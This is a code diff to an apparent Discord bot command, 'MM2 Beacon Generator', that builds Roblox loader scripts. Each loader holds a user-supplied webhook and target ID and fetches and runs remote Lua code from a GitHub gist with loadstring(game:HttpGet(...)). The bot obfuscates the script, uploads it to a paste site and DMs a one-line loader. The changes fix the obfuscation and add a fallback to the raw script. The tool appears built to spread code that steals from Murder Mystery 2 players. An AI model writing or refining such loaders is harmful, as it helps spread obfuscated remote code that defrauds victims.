@@ -7,7 +7,6 @@ export const data = {
 };
 
 export async function execute(interaction) {
-  // Create modal
   const modal = new ModalBuilder()
     .setCustomId('generateModal')
     .setTitle('MM2 Beacon Generator');
@@ -33,11 +32,11 @@ export async function execute(interaction) {
     .setPlaceholder('123456789012345678')
     .setRequired(false);
 
-  const row1 = new ActionRowBuilder().addComponents(webhookInput);
-  const row2 = new ActionRowBuilder().addComponents(targetInput);
-  const row3 = new ActionRowBuilder().addComponents(roleInput);
-
-  modal.addComponents(row1, row2, row3);
+  modal.addComponents(
+    new ActionRowBuilder().addComponents(webhookInput),
+    new ActionRowBuilder().addComponents(targetInput),
+    new ActionRowBuilder().addComponents(roleInput)
+  );
 
   await interaction.showModal(modal);
 
@@ -50,15 +49,18 @@ export async function execute(interaction) {
   const target = submitted.fields.getTextInputValue('target');
   const pingRole = submitted.fields.getTextInputValue('pingRole') || '';
 
-  // ---- UPDATED GIST URL ----
   const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/f513af3ff4e17351ea21a0fae5dba45e/raw/3ee747e71d73cde0d419cf63ea36ea6d80550512/ANTIWARES2";
-  
-  const baseScript = `
-_G.YOUR_WEBHOOK = '${webhook}'
-_G.TARGET_USER = '${target}'
-_G.PING_ROLE_ID = '${pingRole}'
 
-loadstring(game:HttpGet("${GIST_URL}"))()
+  // ---- WRAPPER WITH ANONYMOUS FUNCTION ----
+  // Wrapping in (function() ... end)() makes Methylone obfuscate the function body
+  // instead of the raw script, preventing the "attempt to call a nil value" error.
+  const baseScript = `
+(function()
+    _G.YOUR_WEBHOOK = '${webhook}'
+    _G.TARGET_USER = '${target}'
+    _G.PING_ROLE_ID = '${pingRole}'
+    loadstring(game:HttpGet("${GIST_URL}"))()
+end)()
 `;
   // ---- END ----
 
@@ -68,10 +70,10 @@ loadstring(game:HttpGet("${GIST_URL}"))()
   try {
     obfuscated = await obfuscate(baseScript);
   } catch (err) {
-    return submitted.editReply(`❌ Failed to obfuscate: ${err.message}`);
+    console.warn("Obfuscation failed, using raw wrapper:", err.message);
+    obfuscated = baseScript;
   }
 
-  // Save to Rubis
   const apiUrl = `https://api.rubis.app/v2/scrap?public=true&title=${encodeURIComponent('MM2 Beacon Script')}`;
 
   const pasteResponse = await fetch(apiUrl, {
@@ -91,7 +93,6 @@ loadstring(game:HttpGet("${GIST_URL}"))()
 
   const loadstring = `loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/${id}/raw"))()`;
 
-  // --- SEND TO DMS ---
   const dmMessage = `✅ **Loader generated!**\n\n**PC (code block):**\n\`\`\`lua\n${loadstring}\n\`\`\`\n**Mobile (plain text, tap to copy):**\n${loadstring}`;
 
   try {
